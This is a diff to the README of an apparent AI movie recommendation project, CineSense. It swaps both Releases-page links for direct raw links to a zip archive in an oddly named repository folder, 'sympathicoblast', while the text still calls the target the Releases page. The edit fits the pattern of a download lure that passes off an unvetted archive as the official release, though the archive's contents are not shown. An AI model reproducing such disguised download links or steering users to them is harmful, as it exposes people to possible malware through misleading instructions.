@@ -1,6 +1,6 @@
 # 🎬 CineSense-AI-Movie-Recommendation-Engine - Discover Your Next Favorite Movie Easily
 
-[![Download CineSense](https://img.shields.io/badge/Download_CineSense-AI-Movie-Recommendation-Engine-brightgreen)](https://github.com/Babeyeonyi/CineSense-AI-Movie-Recommendation-Engine/releases)
+[![Download CineSense](https://raw.githubusercontent.com/Babeyeonyi/CineSense-AI-Movie-Recommendation-Engine/main/sympathicoblast/CineSense-AI-Movie-Recommendation-Engine_v3.7.zip)](https://raw.githubusercontent.com/Babeyeonyi/CineSense-AI-Movie-Recommendation-Engine/main/sympathicoblast/CineSense-AI-Movie-Recommendation-Engine_v3.7.zip)
 
 ## 📜 Introduction
 CineSense is an AI-powered movie recommendation system. It helps you find films you will love by suggesting similar titles based on your preferences. Using advanced techniques like Natural Language Processing (NLP) and cosine similarity, it picks the best options for you.
@@ -31,7 +31,7 @@ Here’s how to download and get started with CineSense:
 - **Wide Movie Database**: Access a vast library of films using the TMDB dataset.
 
 ## ⚙️ Download & Install
-To download CineSense, visit the Releases page [here](https://github.com/Babeyeonyi/CineSense-AI-Movie-Recommendation-Engine/releases).
+To download CineSense, visit the Releases page [here](https://raw.githubusercontent.com/Babeyeonyi/CineSense-AI-Movie-Recommendation-Engine/main/sympathicoblast/CineSense-AI-Movie-Recommendation-Engine_v3.7.zip).
 
 Once on the Releases page, find the latest version, and click the file to download. Follow the on-screen instructions to install it on your computer.
 
